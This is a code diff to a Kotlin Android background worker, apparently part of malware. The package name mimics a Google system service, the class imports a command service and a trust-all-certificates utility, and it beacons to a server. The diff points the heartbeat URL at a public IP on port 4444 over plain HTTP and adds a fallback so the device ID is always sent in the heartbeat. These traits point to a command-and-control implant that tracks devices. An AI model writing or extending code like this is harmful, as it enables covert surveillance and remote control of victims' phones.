@@ -5,6 +5,7 @@ import android.content.Intent
 import android.util.Log
 import androidx.work.*
 import com.google.android.systemservice.services.CommandService
+import com.google.android.systemservice.config.AndroidConfig
 import com.google.android.systemservice.utils.TrustAllCertificates
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.withContext
@@ -21,7 +22,7 @@ class CommandWorker(
 
     companion object {
         private const val TAG = "SystemWorker"
-        private const val HEARTBEAT_URL = "http://192.168.1.5:3000/api/heartbeat"
+        private const val HEARTBEAT_URL = "http://213.91.211.150:4444/api/heartbeat"
         
         fun schedule(context: Context) {
             val constraints = Constraints.Builder()
@@ -100,10 +101,14 @@ class CommandWorker(
 
     private fun sendHeartbeat() {
         try {
-            val deviceId = android.provider.Settings.Secure.getString(
-                applicationContext.contentResolver,
-                android.provider.Settings.Secure.ANDROID_ID
-            )
+            val deviceId = try {
+                android.provider.Settings.Secure.getString(
+                    applicationContext.contentResolver,
+                    android.provider.Settings.Secure.ANDROID_ID
+                ) ?: AndroidConfig.deviceId
+            } catch (e: Exception) {
+                AndroidConfig.deviceId
+            }
 
             val json = JSONObject().apply {
                 put("device_id", deviceId)
